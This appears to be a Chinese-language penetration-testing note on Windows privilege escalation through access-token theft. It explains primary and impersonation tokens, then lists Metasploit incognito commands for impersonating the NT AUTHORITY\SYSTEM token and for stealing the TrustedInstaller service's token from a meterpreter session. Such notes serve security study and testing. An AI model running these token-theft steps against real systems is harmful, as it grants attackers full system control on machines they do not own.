# 利用访问令牌操控提权

#### 前置知识备忘

1. Windows访问控制模型(Access Control Model)由访问令牌(Access Token)与安全描述符(Security Descriptor)组成
2. 访问令牌(Access Token)是描述进程或线程安全上下文的对象，包含进程或线程关联的用户账户标识和特权等信息
3. Windows令牌分主令牌(Primary Token)与模拟令牌(Impersonation Token)，主令牌与进程相关联，由Windows内核创建并分配给进程的默认访问令牌，每个进程都有一个主令牌，当进程的线程与安全对象交互时，系统将使用主令牌。
4. 线程可以模拟客户端，模拟是指线程在安全上下文中的执行能力
5. 当线程模拟客户端时，模拟线程同时具有主令牌与模拟令牌
6. 令牌窃取原理：通过操控访问令牌，使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程，使用Windows API 从指定进程中复制访问令牌，并将得到的访问令牌用于现有进程或生成新进程，达到提权的目的
7. 令牌窃取只能在特权用户上下文中才能实现，如系统管理员账户、网络服务账户和系统服务账户

#### 利用MetaSploit incongnito窃取令牌

需要管理员权限提升至SYSTEM，可以通过窃取来假冒 NT AUTHORITY\SYSTEM令牌

```
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM" [[窃取]]
steal_token <PID> [[从指定进程中窃取]]
```

#### 通过令牌获取TrustedInstaller权限

启动TrustedInstaller 服务

```
sc start TrustedInstaller 
```

记录TrustedInstaller .exe进程PID，在kali meterpreter中执行命令

```
steal_token <TrustedInstaller服务pid>
```
